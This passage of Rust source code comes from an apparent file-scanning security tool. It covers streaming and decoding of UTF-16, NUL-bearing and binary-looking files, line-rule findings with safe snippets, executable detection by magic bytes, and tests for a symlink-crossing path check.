    }
    // Head rules need only the name and the first bytes, so a large file is
    // no way around them, and they never make it count as too large.
    let executable = native_format(&head, Some((&path, size)));
    let headed = env.run_head_checks(
        relative,
        slash_path,
        head_of(&head),
        None,
        executable,
        Some(size),
    );
    let named_executable = headed.named_executable;
    out.findings.extend(headed.findings);
    let applicable: Vec<&Rule> = rules
        .iter()
        .filter(|rule| rule.applies_to(slash_path))
        .collect();
    let whole_file_rule = file_rule_applies
        || applicable
            .iter()
            .any(|rule| matches!(rule.matcher, Matcher::Jsonc(_)));
    let too_large = Skipped {
        path: relative.to_path_buf(),
        reason: SkipReason::TooLarge { size },
    };
    // A rule that selects the file by name gets to see it as too large (that
    // happens after the walk), executable or not, as for a file over the limit.
    if let Some(format) = executable {
        if whole_file_rule {
            out.skipped.push(too_large);
        }
        // As for a file read whole.
        out.skipped.push(Skipped {
            path: relative.to_path_buf(),
            reason: SkipReason::Executable {
                format,
                reported: named_executable,
            },
        });
        return out;
    }

    let script = is_script(slash_path, &head);
    if whole_file_rule {
        out.skipped.push(too_large);
    }
    if is_utf16_script(slash_path, &head) {
        // Decoded as it is read, as for a file read whole (`Decode::Utf16Bom`).
        // Not a script for the NUL rule, and the text is never the file byte
        // for byte, so no spans; columns are exact.
        let mut lines = LineScanner::new(&applicable, &env.bidi_budget);
        if !lines.is_empty() {
            let file = match File::open(&path) {
                Ok(file) => file,
                Err(err) => {
                    out.skipped.push(unreadable(err));
                    return out;
                }
            };
            let mut decoder = Utf16Lines::new(limits.max_line_size);
            let fed = stream_utf16(file, &mut decoder, |number, text| {
                lines.feed(relative, number, text, None, true);
            });
            match fed {
                Ok(None) => {}
                Ok(Some(line)) => out.skipped.push(Skipped {
                    path: relative.to_path_buf(),
                    reason: SkipReason::LineTooLong { line },
                }),
                Err(err) => out.skipped.push(unreadable(err)),
            }
        }
        out.findings.append(&mut lines.finish(relative, unlisted));
        out.scanned = true;
        return out;
    }

    // First pass: how much of the file is NUL, and is the rest text.
    let mut probe = NulProbe::default();
    let measured = File::open(&path).and_then(|mut file| {
        let mut chunk = vec![0; 64 * 1024];
        loop {
            match file.read(&mut chunk)? {
                0 => return Ok(()),
                n => probe.feed(&chunk[..n]),
            }
        }
    });
    if let Err(err) = measured {
        out.skipped.push(unreadable(err));
        return out;
    }
    let binary_looking = !script
        && ((looks_binary(&head) && known_binary_magic(&head))
            || (probe.nuls > 0 && !probe.is_text()));
    if binary_looking {
        out.skipped.push(Skipped {
            path: relative.to_path_buf(),
            reason: SkipReason::Binary,
        });
    }
    let nul_line = if script { probe.first_nul_line } else { None };
    let identical = !binary_looking && probe.nuls == 0 && probe.is_text();

    for rule in &applicable {
        if let (Matcher::NulByte, Some(line)) = (&rule.matcher, nul_line) {
            // As for a file read whole (`nul_span`).
            let span = probe
                .first_nul_offset
                .and_then(|offset| usize::try_from(offset).ok())
                .map(|offset| offset..offset + 1);
            out.findings.push(Finding {
                rule_id: rule.id.clone(),
                severity: rule.severity,
                stage: rule.stage,
                attack: rule.attack.clone(),
                file: relative.to_path_buf(),
                line,
                column: None,
                span,
                snippet: None,
                explanation: rule.description.clone(),
            });
        }
    }

    // Second pass: the line rules.
    let mut lines = LineScanner::new(&applicable, &env.bidi_budget);
    if !lines.is_empty() {
        let file = match File::open(&path) {
            Ok(file) => file,
            Err(err) => {
                out.skipped.push(unreadable(err));
                return out;
            }
        };
        let mut reader = BufReader::new(file);
        let mut line = Vec::new();
        let mut number = 0;
        // Where the next line starts in the file.
        let mut offset: u64 = 0;
        loop {
            line.clear();
            let cap = limits.max_line_size as u64 + 2;
            let line_start = offset;
            match (&mut reader).take(cap).read_until(b'\n', &mut line) {
                Ok(0) => break,
                Ok(read) => offset += read as u64,
                Err(err) => {
                    out.skipped.push(unreadable(err));
                    break;
                }
            }
            number += 1;
            if line.last() != Some(&b'\n') && line.len() > limits.max_line_size {
                out.skipped.push(Skipped {
                    path: relative.to_path_buf(),
                    reason: SkipReason::LineTooLong { line: number },
                });
                break;
            }
            if line.last() == Some(&b'\n') {
                line.pop();
                if line.last() == Some(&b'\r') {
                    line.pop();
                }
            }
            let text = if binary_looking {
                Cow::Owned(ascii_only_text(&line))
            } else {
                text_without_nuls(&line)
            };
            // As for a file read whole, a span is given only when the whole
            // file is its own text: no NUL bytes, valid UTF-8, not read as ASCII.
            let file_offset = if identical {
                usize::try_from(line_start).ok()
            } else {
                None
            };
            lines.feed(relative, number, &text, file_offset, identical);
        }
    }
    let mut found = lines.finish(relative, unlisted);
    if binary_looking {
        for finding in &mut found {
            finding.explanation.push_str(BINARY_LOOKING_NOTE);
        }
    }
    out.findings.append(&mut found);
    out.scanned = true;
    out
}

/// Reads UTF-16 with a byte order mark through `decoder`, handing each
/// line to `feed` as it is completed. Returns the line that was too long, if
/// one stopped the reading.
fn stream_utf16(
    mut file: impl Read,
    decoder: &mut Utf16Lines,
    mut feed: impl FnMut(usize, &str),
) -> io::Result<Option<usize>> {
    let mut bom = [0; 2];
    file.read_exact(&mut bom)?;
    let little_endian = bom == [0xFF, 0xFE];
    let mut chunk = vec![0; 64 * 1024];
    let mut odd: Option<u8> = None;
    loop {
        let read = file.read(&mut chunk)?;
        if read == 0 {
            break;
        }
        let mut bytes = &chunk[..read];
        if let Some(first) = odd.take() {
            let pair = [first, bytes[0]];
            bytes = &bytes[1..];
            if let Some(line) = decoder.unit(utf16_unit(pair, little_endian), &mut feed) {
                return Ok(Some(line));
            }
        }
        let (pairs, rest) = bytes.as_chunks::<2>();
        for &pair in pairs {
            if let Some(line) = decoder.unit(utf16_unit(pair, little_endian), &mut feed) {
                return Ok(Some(line));
            }
        }
        odd = rest.first().copied();
    }
    // A trailing odd byte is one unit of U+FFFD, as in `decode_utf16_bom`.
    if odd.is_some()
        && let Some(line) = decoder.unit(0xFFFD, &mut feed)
    {
        return Ok(Some(line));
    }
    Ok(decoder.finish(&mut feed))
}

fn utf16_unit(pair: [u8; 2], little_endian: bool) -> u16 {
    if little_endian {
        u16::from_le_bytes(pair)
    } else {
        u16::from_be_bytes(pair)
    }
}

/// Turns UTF-16 code units into the lines `str::lines` would give for
/// `decode_utf16_bom` of the whole file: unpaired surrogates become U+FFFD,
/// lines end at `\n` with one `\r` before it removed, and a last line without
/// an ending still counts. A line is kept in memory up to `max_line` bytes.
struct Utf16Lines {
    line: String,
    number: usize,
    high: Option<u16>,
    max_line: usize,
}

impl Utf16Lines {
    fn new(max_line: usize) -> Self {
        Utf16Lines {
            line: String::new(),
            number: 0,
            high: None,
            max_line,
        }
    }

    /// Takes one code unit. Returns the number of a line that grew past the
    /// limit, after which nothing more should be fed.
    fn unit(&mut self, unit: u16, feed: &mut impl FnMut(usize, &str)) -> Option<usize> {
        if let Some(high) = self.high.take() {
            if (0xDC00..0xE000).contains(&unit) {
                let code =
                    0x10000 + ((u32::from(high) - 0xD800) << 10) + (u32::from(unit) - 0xDC00);
                return self.char(
                    char::from_u32(code).unwrap_or(char::REPLACEMENT_CHARACTER),
                    feed,
                );
            }
            if let Some(line) = self.char(char::REPLACEMENT_CHARACTER, feed) {
                return Some(line);
            }
        }
        if (0xD800..0xDC00).contains(&unit) {
            self.high = Some(unit);
            return None;
        }
        let c = char::from_u32(u32::from(unit)).unwrap_or(char::REPLACEMENT_CHARACTER);
        self.char(c, feed)
    }

    fn char(&mut self, c: char, feed: &mut impl FnMut(usize, &str)) -> Option<usize> {
        if c == '\0' {
            // Dropped, as in `decode_utf16_bom`.
            return None;
        }
        if c == '\n' {
            if self.line.ends_with('\r') {
                self.line.pop();
            }
            self.number += 1;
            feed(self.number, &self.line);
            self.line.clear();
            return None;
        }
        self.line.push(c);
        // A `\r` that may still turn out to end the line does not count, as
        // on the byte path, which allows the limit plus `\r\n`.
        let length = self.line.len() - usize::from(self.line.ends_with('\r'));
        (length > self.max_line).then_some(self.number + 1)
    }

    /// Ends the text: a pending high surrogate is U+FFFD, and a last line
    /// without `\n` is fed as it is.
    fn finish(&mut self, feed: &mut impl FnMut(usize, &str)) -> Option<usize> {
        if self.high.take().is_some()
            && let Some(line) = self.char(char::REPLACEMENT_CHARACTER, feed)
        {
            return Some(line);
        }
        if !self.line.is_empty() {
            self.number += 1;
            feed(self.number, &self.line);
            self.line.clear();
        }
        None
    }
}

/// Runs line, JSONC and other text rules over one file's text. `relative` is
/// the path shown in findings; `slash_path` is matched against each rule's
/// `files` globs.
fn scan_text<'v>(
    relative: &Path,
    slash_path: &'v str,
    views: &'v Views<'v>,
    nul_line: Option<usize>,
    env: &'v Env<'v>,
    rules: &[Rule],
    unlisted: &mut Vec<Unlisted>,
) -> Vec<Finding> {
    let applicable: Vec<&Rule> = rules
        .iter()
        .filter(|rule| rule.applies_to(slash_path))
        .collect();
    if applicable.is_empty() {
        return Vec::new();
    }

    let text = views.text();
    let identical = views.text_is_bytes();
    let column_exact = views.columns_are_exact();
    let mut findings = Vec::new();
    let mut lines = LineScanner::new(&applicable, &env.bidi_budget);
    for (index, line) in text.lines().enumerate() {
        // `lines` hands out slices of `text`, so the distance between the
        // pointers is where the line starts.
        let file_offset = identical
            .then(|| (line.as_ptr() as usize).checked_sub(text.as_ptr() as usize))
            .flatten();
        lines.feed(relative, index + 1, line, file_offset, column_exact);
    }
    findings.extend(lines.finish(relative, unlisted));
    for rule in applicable {
        match &rule.matcher {
            // Done above, in one pass over the lines.
            Matcher::LineRegex(_) | Matcher::BidiDisplay => {}
            Matcher::Jsonc(check) => {
                let ctx = Ctx::new(
                    slash_path,
                    None,
                    env.index,
                    env.truncated,
                    rule.severity,
                    views,
                );
                for (index, hit) in check(&ctx).into_iter().enumerate() {
                    findings.push(hit_finding(rule, relative, hit, index, views, true));
                }
            }
            // File-level and head rules already ran on the raw bytes.
            Matcher::File(_) | Matcher::Head(_) => {}
            Matcher::NulByte => {
                if let Some(line) = nul_line {
                    findings.push(Finding {
                        rule_id: rule.id.clone(),
                        severity: rule.severity,
                        stage: rule.stage,
                        attack: rule.attack.clone(),
                        file: relative.to_path_buf(),
                        line,
                        column: None,
                        span: nul_span(views.bytes()),
                        snippet: None,
                        explanation: rule.description.clone(),
                    });
                }
            }
        }
    }
    findings
}

/// Turns what a check reported into a finding. `own_bytes` is false for an
/// entry the walk did not hand over (an oversized file, or a symbolic link
/// whose bytes are its target's): it has no text of its own to point into, so
/// its findings get no location.
fn hit_finding(
    rule: &Rule,
    relative: &Path,
    hit: Hit,
    index: usize,
    views: &Views<'_>,
    own_bytes: bool,
) -> Finding {
    let location = match &hit.span {
        Some(TextSpan(span)) if own_bytes && index < MAX_LOCATED_HITS => {
            locate_hit(views, hit.line, span)
        }
        _ => Location::default(),
    };
    Finding {
        rule_id: rule.id.clone(),
        severity: hit.severity,
        stage: rule.stage,
        attack: rule.attack.clone(),
        file: relative.to_path_buf(),
        line: hit.line,
        column: location.column,
        span: location.span,
        snippet: location.snippet,
        // The reason may quote the scanned file, so it is cleaned before it can
        // reach a terminal.
        explanation: display_safe(&hit.reason, MAX_EXPLANATION_CHARS),
    }
}

/// Where a check's span is, if it holds up: a span that is reversed, out of
/// bounds or splits a character is dropped, and so is one that is not on the
/// line the check reported. A check that splits lines its own way (the `.pth`
/// rules split on more than `\n`) could otherwise get a column and a snippet
/// from another line than the one it names.
fn locate_hit(views: &Views<'_>, line: usize, span: &Range<usize>) -> Location {
    let text = views.text();
    if span.start > span.end
        || !text.is_char_boundary(span.start)
        || !text.is_char_boundary(span.end)
        || views.line_of(span.start) != line
    {
        return Location::default();
    }
    let identical = views.text_is_bytes();
    Location::in_text(text, span, views.columns_are_exact(), identical)
}

/// Where in its line a finding points.
#[derive(Debug, Default, PartialEq, Eq)]
struct Location {
    column: Option<usize>,
    span: Option<Range<usize>>,
    snippet: Option<String>,
}

impl Location {
    /// `line` is a whole line without its terminator and `at` a byte offset in
    /// it. `column_exact` says whether a count of characters in the line is a
    /// column (see `Views::columns_are_exact`); on the first line of a file a
    /// byte order mark is not counted. `span` is passed through.
    fn in_line(
        line: &str,
        at: usize,
        first_line: bool,
        column_exact: bool,
        span: Option<Range<usize>>,
    ) -> Location {
        let (line, at) = match line.strip_prefix('\u{feff}') {
            Some(rest) if first_line => (rest, at.saturating_sub('\u{feff}'.len_utf8())),
            _ => (line, at),
        };
        let Some(before) = line.get(..at.min(line.len())) else {
            return Location {
                span,
                ..Location::default()
            };
        };
        Location {
            column: column_exact.then(|| before.chars().count() + 1),
            span,
            snippet: Some(snippet(line, before.len())),
        }
    }

    /// `span` is a valid byte range in `text`; `identical` says whether `text`
    /// is the file byte for byte, so the range is also the file's.
    fn in_text(text: &str, span: &Range<usize>, column_exact: bool, identical: bool) -> Location {
        let line_start = text[..span.start].rfind('\n').map_or(0, |at| at + 1);
        let line_end = text[span.start..]
            .find('\n')
            .map_or(text.len(), |at| span.start + at);
        let line = &text[line_start..line_end];
        let line = line.strip_suffix('\r').unwrap_or(line);
        Location::in_line(
            line,
            span.start - line_start,
            line_start == 0,
            column_exact,
            identical.then(|| span.clone()),
        )
    }
}

/// The byte range of the first NUL byte of a file. A NUL finding gets only
/// this: the byte is exact, while a column in text that has the NULs dropped
/// would point next to it.
fn nul_span(bytes: &[u8]) -> Option<Range<usize>> {
    let at = bytes.iter().position(|&b| b == 0)?;
    Some(at..at + 1)
}

/// A short, printable piece of `line` around byte offset `at`. Leading
/// whitespace is dropped and tabs become spaces. Before the match, at most
/// `SNIPPET_LEAD_CHARS` characters of output are kept, counted after escaping,
/// so a run of escaped characters cannot push the match out of view; the match
/// and what follows fill the rest of `MAX_SNIPPET_CHARS`. `...` marks each
/// cut. Only the window is ever escaped, never the whole line.
fn snippet(line: &str, at: usize) -> String {
    let body = line.trim_start();
    let at = at.saturating_sub(line.len() - body.len()).min(body.len());
    let Some((before, after)) = body.split_at_checked(at) else {
        return String::new();
    };
    let shown = |c: char| {
        let mut buffer = [0; 4];
        let text = if c == '\t' {
            " "
        } else {
            &*c.encode_utf8(&mut buffer)
        };
        snippet_safe(text, 16)
    };

    let mut lead = Vec::new();
    let mut used = 0;
    let mut cut = false;
    for c in before.chars().rev() {
        let piece = shown(c);
        let cost = piece.chars().count();
        if used + cost > SNIPPET_LEAD_CHARS {
            cut = true;
            break;
        }
        used += cost;
        lead.push(piece);
    }

    let mut out = String::new();
    if cut {
        out.push_str("...");
    }
    for piece in lead.iter().rev() {
        out.push_str(piece);
    }
    let tail: String = after
        .chars()
        .take(MAX_SNIPPET_CHARS + 1)
        .map(|c| if c == '\t' { ' ' } else { c })
        .collect();
    out.push_str(&snippet_safe(tail.trim_end(), MAX_SNIPPET_CHARS - used));
    out
}

/// What the scanner decides about a file before any rule runs.
struct Class {
    /// The executable format, if the file is one. Such a file is listed and
    /// not read by the text rules.
    executable: Option<&'static str>,
    /// The 1-based line of the first NUL byte in a script.
    nul_line: Option<usize>,
    /// Data with NUL bytes that does not read as text, or with a known binary
    /// header: listed, and read by the line rules as ASCII only.
    binary_looking: bool,
    /// How the text rules read the file.
    decode: Decode,
}

/// Classifies a file from its path and content.
fn classify(slash_path: &str, bytes: &[u8]) -> Class {
    let script = is_script(slash_path, bytes);
    let nul_line = script.then(|| first_nul_line(bytes)).flatten();
    let mut utf16 = false;
    let mut binary_looking = false;

    if let Some(format) = native_format(bytes, None) {
        return Class {
            executable: Some(format),
            nul_line,
            binary_looking: false,
            decode: Decode::AsciiOnly,
        };
    }
    if is_utf16_script(slash_path, bytes) {
        // A script whose host decodes a UTF-16 byte order mark is decoded
        // whatever its first bytes hold: text made only of characters such
        // as U+0101 has no NUL byte at all.
        utf16 = true;
    } else if looks_binary(bytes) && !script && known_binary_magic(bytes) {
        // A script with a NUL byte is still a script, and the NUL is reported
        // by its own rule (`nul_line`).
        binary_looking = true;
    }
    // Any other file with a NUL byte that does not read as text, and any file
    // with a known binary header, may still be sourced by a shell: `dash` drops
    // the NULs and runs the rest, whatever else is in the file (`GIF89a=1` is a
    // valid assignment). So it goes to the line rules too, but only as ASCII
    // (see `ascii_only_text`), because on data such as icons and audio a rule
    // that looks for a non-ASCII character matches by chance. It is listed, so
    // the report shows that its binary contents were not looked at.
    if !script && !utf16 && bytes.contains(&0) && !nul_file_is_text(bytes) {
        binary_looking = true;
    }
    let decode = if utf16 {
        Decode::Utf16Bom
    } else if binary_looking {
        Decode::AsciiOnly
    } else {
        Decode::Utf8WithoutNuls
    };
    Class {
        executable: None,
        nul_line,
        binary_looking,
        decode,
    }
}

/// The text of a file as the rules read it.
pub(crate) fn decode(decode: Decode, bytes: &[u8]) -> Cow<'_, str> {
    match decode {
        Decode::Utf8WithoutNuls => text_without_nuls(bytes),
        Decode::AsciiOnly => Cow::Owned(ascii_only_text(bytes)),
        Decode::Utf16Bom => Cow::Owned(decode_utf16_bom(bytes)),
    }
}

/// Whether the file is meant to be read as a script: it has a script
/// extension or starts with a shebang. A script that is decoded from UTF-16
/// (`is_utf16_script`) is not one here, because UTF-16 text is full of NUL
/// bytes by design (Windows PowerShell writes it by default).
fn is_script(slash_path: &str, bytes: &[u8]) -> bool {
    if is_utf16_script(slash_path, bytes) {
        return false;
    }
    has_script_extension(slash_path) || bytes.starts_with(b"#!")
}

/// A file with a UTF-16 byte order mark whose host decodes it as UTF-16
/// (a script extension that is not in `BYTE_SCRIPT_EXTENSIONS`).
fn is_utf16_script(slash_path: &str, bytes: &[u8]) -> bool {
    has_utf16_bom(bytes)
        && has_script_extension(slash_path)
        && !extension_in(slash_path, BYTE_SCRIPT_EXTENSIONS)
}

fn has_script_extension(slash_path: &str) -> bool {
    extension_in(slash_path, SCRIPT_EXTENSIONS)
}

fn extension_in(slash_path: &str, extensions: &[&str]) -> bool {
    slash_path
        .rsplit('/')
        .next()
        .and_then(|name| name.rsplit_once('.'))
        .map(|(_, extension)| extension.to_ascii_lowercase())
        .is_some_and(|ext| extensions.contains(&ext.as_str()))
}

fn has_utf16_bom(bytes: &[u8]) -> bool {
    bytes.starts_with(&[0xFF, 0xFE]) || bytes.starts_with(&[0xFE, 0xFF])
}

/// Decodes UTF-16 after its byte order mark; unpaired surrogates and a odd
/// trailing byte become U+FFFD, and U+0000 is dropped, as NUL bytes are on the
/// other paths. That also keeps a UTF-32 LE file (`FF FE 00 00`), which
/// PowerShell reads, from hiding its ASCII behind a U+0000 after every
/// character: decoded as UTF-16 it reads as its own text.
fn decode_utf16_bom(bytes: &[u8]) -> String {
    let little_endian = bytes.starts_with(&[0xFF, 0xFE]);
    let units = bytes[2..].chunks(2).map(|pair| match *pair {
        [a, b] if little_endian => u16::from_le_bytes([a, b]),
        [a, b] => u16::from_be_bytes([a, b]),
        _ => 0xFFFD,
    });
    char::decode_utf16(units)
        .map(|unit| unit.unwrap_or(char::REPLACEMENT_CHARACTER))
        .filter(|&c| c != '\0')
        .collect()
}

/// Headers of formats that are binary data by design: archives, compressed
/// streams, images, documents, WebAssembly and fonts. A file with one of them
/// is still read as ASCII by the line rules (a shell may source it).
fn known_binary_magic(bytes: &[u8]) -> bool {
    const MAGICS: [&[u8]; 17] = [
        &[0x1F, 0x8B],
        &[0x28, 0xB5, 0x2F, 0xFD],
        b"BZh",
        &[0xFD, b'7', b'z', b'X', b'Z', 0],
        b"PK\x03\x04",
        b"PK\x05\x06",
        b"7z\xBC\xAF\x27\x1C",
        b"Rar!",
        b"\x89PNG",
        &[0xFF, 0xD8, 0xFF],
        b"GIF8",
        b"%PDF",
        b"\0asm",
        b"RIFF",
        b"wOF",
        b"OTTO",
        b"\0\x01\0\0",
    ];
    MAGICS.iter().any(|magic| bytes.starts_with(magic))
}

/// The file as `dash` and `bash` read it: the NUL bytes are dropped first and
/// the rest is decoded, so a multi-byte character cut by a NUL is whole again.
/// Borrowed exactly when the text is byte for byte the file.
fn text_without_nuls(bytes: &[u8]) -> Cow<'_, str> {
    if !bytes.contains(&0) {
        return String::from_utf8_lossy(bytes);
    }
    let kept: Vec<u8> = bytes.iter().copied().filter(|&b| b != 0).collect();
    Cow::Owned(String::from_utf8_lossy(&kept).into_owned())
}

/// Like `text_without_nuls`, but every non-ASCII byte becomes U+FFFD, so a
/// rule can only match ASCII. Used for NUL-bearing data that does not read as
/// text: the code a shell would run is still there, and noise cannot spell a
/// character by chance.
fn ascii_only_text(bytes: &[u8]) -> String {
    bytes
        .iter()
        .filter(|&&b| b != 0)
        .map(|&b| {
            if b.is_ascii() {
                char::from(b)
            } else {
                char::REPLACEMENT_CHARACTER
            }
        })
        .collect()
}

/// Whether a file that contains NUL bytes reads as text with a few stray ones:
/// the NULs are at most one byte in `MAX_NUL_RATIO`, and the rest is valid
/// UTF-8 once they are removed. Random data (compressed audio, icons) fails the
/// second test almost at once.
fn nul_file_is_text(bytes: &[u8]) -> bool {
    let mut probe = NulProbe::default();
    probe.feed(bytes);
    probe.is_text()
}

/// The two measurements behind `nul_file_is_text`, taken over a stream of
/// chunks so a large file never has to be in memory at once.
#[derive(Default)]
struct NulProbe {
    total: u64,
    nuls: u64,
    /// The start of a multi-byte UTF-8 sequence cut off by the end of a chunk.
    pending: Vec<u8>,
    invalid: bool,
    /// Lines ended before the first NUL byte, counted until it is found.
    newlines: usize,
    /// The 1-based line of the first NUL byte, counting `\n` as shells do.
    first_nul_line: Option<usize>,
    /// The byte offset of the first NUL byte in the file.
    first_nul_offset: Option<u64>,
}

impl NulProbe {
    fn feed(&mut self, chunk: &[u8]) {
        let chunk_start = self.total;
        self.total += chunk.len() as u64;
        if self.first_nul_line.is_none() {
            let before = chunk.iter().position(|&b| b == 0);
            let end = before.unwrap_or(chunk.len());
            self.newlines += chunk[..end].iter().filter(|&&b| b == b'\n').count();
            if let Some(position) = before {
                self.first_nul_line = Some(1 + self.newlines);
                self.first_nul_offset = Some(chunk_start + position as u64);
            }
        }
        for (index, segment) in chunk.split(|&b| b == 0).enumerate() {
            if index > 0 {
                self.nuls += 1;
            }
            if self.invalid || segment.is_empty() {
                continue;
            }
            self.pending.extend_from_slice(segment);
            match std::str::from_utf8(&self.pending) {
                Ok(_) => self.pending.clear(),
                Err(err) if err.error_len().is_none() => {
                    self.pending.drain(..err.valid_up_to());
                }
                Err(_) => self.invalid = true,
            }
        }
    }

    fn is_text(&self) -> bool {
        !self.invalid && self.pending.is_empty() && self.nuls * MAX_NUL_RATIO <= self.total
    }
}

/// The 1-based line of the first NUL byte, counting `\n` as shells do.
fn first_nul_line(bytes: &[u8]) -> Option<usize> {
    let offset = bytes.iter().position(|&b| b == 0)?;
    Some(1 + bytes[..offset].iter().filter(|&&b| b == b'\n').count())
}

/// Names the executable format a file starts with, by its magic bytes:
/// ELF, PE (the `MZ` header), Mach-O in all four byte orders, and fat Mach-O
/// binaries (32 and 64 bit; fat headers are always big-endian on disk). The
/// fat header `CAFEBABE` is also the header of a Java class file; both are
/// code that runs, so both count.
///
/// An `MZ` header counts as PE unless it points at the `PE\0\0` signature
/// (through `e_lfanew` at offset 0x3C) inside the given bytes and that
/// signature is not there: data that only happens to start with `MZ` is not
/// a program. When the bytes are too short to tell, it still counts.
pub(crate) fn executable_format(bytes: &[u8]) -> Option<&'static str> {
    match bytes {
        [0x7F, b'E', b'L', b'F', ..] => Some("ELF"),
        [b'M', b'Z', ..] => pe_signature_not_missing(bytes).then_some("PE"),
        [0xFE, 0xED, 0xFA, 0xCE | 0xCF, ..] | [0xCE | 0xCF, 0xFA, 0xED, 0xFE, ..] => Some("Mach-O"),
        [0xCA, 0xFE, 0xBA, 0xBE | 0xBF, ..] => Some("Mach-O fat (or Java class)"),
        _ => None,
    }
}

/// False only when an `MZ` header's `e_lfanew` points inside `bytes` and the
/// four bytes there are not `PE\0\0`.
fn pe_signature_not_missing(bytes: &[u8]) -> bool {
    let Some(&[a, b, c, d]) = bytes.get(0x3C..0x40) else {
        return true;
    };
    let offset = u32::from_le_bytes([a, b, c, d]) as usize;
    match offset.checked_add(4).and_then(|end| bytes.get(offset..end)) {
        Some(signature) => signature == b"PE\0\0",
        None => true,
    }
}

/// Same heuristic as git and ripgrep: a NUL byte near the start means binary.
pub(crate) fn looks_binary(bytes: &[u8]) -> bool {
    bytes.iter().take(BINARY_SNIFF_LEN).any(|&b| b == 0)
}

#[cfg(test)]
mod tests {
    /// `crosses_link` as it was in ca78a99: the whole prefix is joined and
    /// lowercased again for every part. Quadratic, but obviously right.
    fn crosses_link_reference(
        link: &str,
        target: &str,
        separators: &[char],
        link_keys: &HashSet<String>,
    ) -> bool {
        let mut parts: Vec<&str> = link.split('/').collect();
        parts.pop();
        for part in target.split(separators) {
            match part {
                "" | "." => {}
                ".." => {
                    if parts.pop().is_none() {
                        return false;
                    }
                }
                _ => {
                    parts.push(part);
                    if link_keys.contains(&parts.join("/").to_lowercase()) {
                        return true;
                    }
                }
            }
        }
        false
    }

    /// A fixed-seed generator (xorshift64*), so a failure repeats.
    struct Rng(u64);

    impl Rng {
        fn next(&mut self) -> u64 {
            self.0 ^= self.0 >> 12;
            self.0 ^= self.0 << 25;
            self.0 ^= self.0 >> 27;
            self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
        }

        fn below(&mut self, n: usize) -> usize {
            (self.next() % n as u64) as usize
        }
    }

    #[test]
    fn crosses_link_agrees_with_the_quadratic_reference() {
        // Names whose lowercase differs in bytes from the original (the
        // dotted capital I, capital sharp s, Cyrillic, final sigma) next to
        // plain ones, with the dot parts, empty parts and backslashes.
        const NAMES: [&str; 12] = [
            "a", "A", "dl", "DL", "x\\y", "\u{130}", "\u{1E9E}", "\u{41A}", "\u{43A}", "\u{3A3}",
            "\u{3C2}", "a\u{3A3}",
        ];
        const DOTS: [&str; 4] = [".", "..", "..", ""];
        let mut rng = Rng(0x9E37_79B9_7F4A_7C15);
        let (mut crossed, mut not_crossed, mut max_segments) = (0, 0, 0);
        for case in 0..30_000 {
            let depth = 1 + rng.below(4);
            let mut link: Vec<&str> = (0..depth).map(|_| NAMES[rng.below(NAMES.len())]).collect();
            link.push("tasks.json");
            let link = link.join("/");

            // Links of different path lengths, built from the same names so
            // that prefixes of the targets hit them.
            let parent: Vec<&str> = link.split('/').collect();
            let keys: HashSet<String> = (0..1 + rng.below(4))
                .map(|_| {
                    // Half of the links sit under a prefix of the link's own
                    // directory, which is where `..` takes a target back to.
                    let mut path: Vec<&str> = if rng.below(2) == 0 {
                        parent[..rng.below(parent.len())].to_vec()
                    } else {
                        Vec::new()
                    };
                    path.extend((0..1 + rng.below(2)).map(|_| NAMES[rng.below(NAMES.len())]));
                    path.join("/").to_lowercase()
                })
                .collect();
            let lengths: HashSet<usize> = keys.iter().map(String::len).collect();

            let segments = if case % 50 == 0 {
                1 + rng.below(64)
            } else {
                1 + rng.below(8)
            };
            max_segments = max_segments.max(segments);
            let parts: Vec<&str> = (0..segments)
                .map(|_| {
                    if rng.below(3) == 0 {
                        DOTS[rng.below(DOTS.len())]
                    } else {
                        NAMES[rng.below(NAMES.len())]
                    }
                })
                .collect();
            let target = parts.join(if rng.below(4) == 0 { "\\" } else { "/" });

            for separators in [&['/'][..], &['/', '\\'][..]] {
                let want = crosses_link_reference(&link, &target, separators, &keys);
                let got = crosses_link(&link, &target, separators, &keys, &lengths);
                assert_eq!(
                    got, want,
                    "link {link:?} target {target:?} separators {separators:?} keys {keys:?}"
                );
                if want {
                    crossed += 1;
                } else {
                    not_crossed += 1;
                }
            }
        }
        // The generator must reach both answers, and long targets.
        assert!(
            crossed > 1000 && not_crossed > 1000,
            "{crossed} {not_crossed}"
        );
        assert!(max_segments >= 60, "{max_segments}");
    }

    /// `crosses_link` must agree with walking the target one part at a time
    /// (the system resolves `..` inside a directory link), and must stay
    /// linear: the target is long, and there can be a hundred thousand links.
    #[test]
    fn crosses_link_is_linear_and_follows_dot_dot_through_a_link() {
        let keys: HashSet<String> = ["a/dl".to_string()].into();
        let lengths: HashSet<usize> = keys.iter().map(String::len).collect();
        let sep: &[char] = &['/'];
        assert!(crosses_link(
            "a/tasks.json",
            "dl/../x.json",
            sep,
            &keys,
            &lengths
        ));
        assert!(crosses_link(
            "a/tasks.json",
            "DL/x.json",
            sep,
            &keys,
            &lengths
        ));
        assert!(crosses_link(
            "a/tasks.json",
            "./dl//../x",
            sep,
            &keys,
            &lengths
        ));
        assert!(!crosses_link(
            "a/tasks.json",
            "dl2/../x.json",
            sep,
            &keys,
            &lengths
        ));
        assert!(!crosses_link(
            "a/tasks.json",
            "../b/x.json",
            sep,
            &keys,
            &lengths
        ));
        assert!(!crosses_link(
            "a/tasks.json",
            "../../x.json",
            sep,
            &keys,
            &lengths
        ));
        assert!(!crosses_link(
            "a/tasks.json",
            "../../../x.json",
            sep,
            &keys,
            &lengths
        ));
        assert!(crosses_link(
            "x/tasks.json",
            "../a/dl/y",
            sep,
            &keys,
            &lengths
        ));

        // Speed is judged by how the time grows, not by its value, which
        // depends on the runner: a target four times as long takes about four
        // times as long when linear and about sixteen times when quadratic.
        // The fastest of several runs is taken to drop scheduler noise.
        let time = |segments: usize| {
            let target = "a/".repeat(segments);
            (0..5)
                .map(|_| {
                    let started = std::time::Instant::now();
                    for _ in 0..20 {
                        assert!(!crosses_link(
                            "w/x.code-workspace",
                            &target,
                            sep,
                            &keys,
                            &lengths
                        ));
                    }
                    started.elapsed()
                })
                .min()
                .unwrap()
        };
        let (short, long) = (time(2_000), time(8_000));
        let ratio = long.as_secs_f64() / short.as_secs_f64();
        assert!(
            ratio < 8.0,
            "4x the target took {ratio:.1}x: {short:?} {long:?}"
        );
    }

    use std::path::PathBuf;

    use globset::{GlobBuilder, GlobSetBuilder};

    use super::*;
    use crate::checks::Hit;
    use crate::finding::{Severity, Stage};
    use crate::rule::parse_rules;

    const RULES: &str = r#"
        [[rule]]
        id = "test.everywhere"
        engine = "line-regex"
        family = "test"
        stage = "run"
        severity = "low"
